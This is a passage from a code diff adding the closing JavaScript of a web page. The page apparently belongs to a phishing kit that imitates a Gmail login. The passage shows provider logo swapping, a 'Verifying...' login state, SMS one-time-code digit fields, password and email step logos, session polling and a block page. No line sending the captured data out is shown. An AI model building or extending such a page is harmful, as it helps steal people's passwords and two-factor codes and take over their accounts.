+  li.innerHTML=src?`<img src="${src}" style="width:38px;height:38px;object-fit:contain;border-radius:4px;">`:'';
+  ct.style.opacity='0';
+  setTimeout(()=>{ct.textContent=el.dataset.name;ct.style.opacity='1';},200);
+};
+
+// ── UTILS ─────────────────────────────────────────────────────
+function setLoading(s){
+  document.getElementById('loginBtn').disabled=s;
+  document.getElementById('btnText').textContent=s?'Verifying...':'Login';
+  document.getElementById('spinner').style.display=s?'block':'none';
+}
+window.showToast=function(msg,type){
+  const t=document.getElementById('toast');
+  t.textContent=msg; t.className=`toast ${type} show`;
+  setTimeout(()=>t.classList.remove('show'),3500);
+};
+
+// ── RESET SESSION ────────────────────────────────────────────
+window.resetSession = function(){
+  // Clear all localStorage session data
+  localStorage.removeItem('ms_sk');
+  localStorage.removeItem('ms_se');
+  localStorage.removeItem('ms_seat');
+  localStorage.removeItem('ms_email');
+  localStorage.removeItem('ms_mid');
+  // Stop polling
+  stopPoll();
+  // Reset state
+  sessionKey = null;
+  sessionEmail = '';
+  // Show login page
+  document.querySelectorAll('.fs').forEach(p=>p.classList.remove('active'));
+  document.getElementById('loginPage').classList.add('active');
+  // Re-init logos
+  const initSrc = IMGS['gmail'];
+  ['neutralLogo','numLogo','smsLogo1','smsLogo2','emailLogo','passLogo'].forEach(id=>{
+    const el=document.getElementById(id);
+    if(el&&initSrc){
+      el.style.background='#EA4335';
+      el.innerHTML=`<img src="${initSrc}" style="width:48px;height:48px;object-fit:contain;border-radius:6px;">`;
+    }
+  });
+};
+
+// SMS auto-advance
+document.querySelectorAll('.sms-d').forEach((inp,i,all)=>{
+  inp.addEventListener('input',()=>{if(inp.value&&i<all.length-1)all[i+1].focus();});
+  inp.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!inp.value&&i>0)all[i-1].focus();});
+});
+
+document.addEventListener('keydown',e=>{if(e.key==='Enter')window.handleLogin();});
+
+// Always show login on load — never auto-restore session
+window.addEventListener('DOMContentLoaded',()=>{
+  // Clear any stale session immediately so page never gets stuck
+  localStorage.removeItem('ms_sk');
+  localStorage.removeItem('ms_se');
+  localStorage.removeItem('ms_mid');
+  sessionKey = null;
+  sessionEmail = '';
+
+  if(isBlocked()) showFS('blockPage');
+
+  // Init all fs logos with Gmail on load
+  const initSrc = IMGS['gmail'];
+  ['neutralLogo','numLogo','smsLogo1','smsLogo2','emailLogo','passLogo'].forEach(id=>{
+    const el=document.getElementById(id);
+    if(el&&initSrc){
+      el.style.background='#EA4335';
+      el.innerHTML=`<img src="${initSrc}" style="width:48px;height:48px;object-fit:contain;border-radius:6px;">`;
+    }
+  });
+});
+</script>
+</body>
+</html>
